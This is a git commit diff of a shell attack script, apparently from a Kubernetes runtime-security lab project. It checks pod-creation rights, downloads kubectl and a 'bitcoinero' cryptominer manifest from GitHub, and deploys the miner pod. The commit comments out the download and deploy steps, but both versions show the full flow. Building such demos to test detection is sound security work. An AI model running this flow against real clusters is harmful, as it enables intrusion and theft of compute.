b259bed7a1ac458fba8ba9549d41e5a20a9e4249
Abdurrahmanm4nn <abdurrahman1270@gmail.com>
2023-03-28 13:16:44 -0400

    refine attacking script

--- attacking-scripts/attack.sh
+++ attacking-scripts/attack.sh
@@ -1,42 +1,38 @@
 #!/bin/bash
 
 # Token Input
-while true; do
-	read -rp "Attack script download token: " TOKEN
-	read -rp "verify token: " verifytoken
-	if [ -n "${TOKEN}" -a "${verifytoken}" = "${TOKEN}" ]; then
-		unset verifytoken
-		break
-	else
-		echo "Tokens do not match."
-	fi
-done
+#while true; do
+#	read -rp "Attack script download token: " TOKEN
+#	read -rp "verify token: " verifytoken
+#	if [ -n "${TOKEN}" -a "${verifytoken}" = "${TOKEN}" ]; then
+#		unset verifytoken
+#		break
+#	else
+#		echo "Tokens do not match."
+#	fi
+#done
+#
+## download bitcoinero.yaml using token inserted at the beginning
+#curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=$TOKEN
+#mv bitcoinero.yaml\?token\=$TOKEN bitcoinero.yaml
 
-# download bitcoinero.yaml using token inserted at the beginning
-if [ -w "$(pwd)" ]; then
-  echo "Current directory is writable."
-else
-  echo "Current directory is not writable. Moving to /tmp"
-  cd /tmp
-fi
-curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=$TOKEN
-mv bitcoinero.yaml\?token\=$TOKEN bitcoinero.yaml
-
-# install kubectl
+# check if kubectl installed
 if command -v kubectl &> /dev/null
 then
+  # check permission to create new pod
   kubectl auth can-i create pods
   PERMISSION="$(kubectl auth can-i create pods)"
   if [ "${PERMISSION}" = "yes" ]; then
   	# execute attack and view result
   	echo "Creating new pod is allowed. Proceed to create bitcoinero pod."
-  	kubectl apply -f bitcoinero.yaml --validate=false
-  	sleep 5
+  	#kubectl apply -f bitcoinero.yaml --validate=false
+  	#sleep 5
   	kubectl get pods
   else
   	echo "Creating new pod is not allowed. Bitcoinero pod creation failed."
   fi
 else
+  # install kubectl
   export PATH=/tmp:$PATH
   cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
   # check permission to create new pod
@@ -44,8 +40,8 @@ else
   if [ "${PERMISSION}" = "yes" ]; then
   	# execute attack and view result
   	echo "Creating new pod is allowed. Proceed to create bitcoinero pod."
-  	./kubectl apply -f bitcoinero.yaml --validate=false
-  	sleep 5
+  	#./kubectl apply -f bitcoinero.yaml --validate=false
+  	#sleep 5
   	./kubectl get pods
   else
   	echo "Creating new pod is not allowed. Bitcoinero pod creation failed."
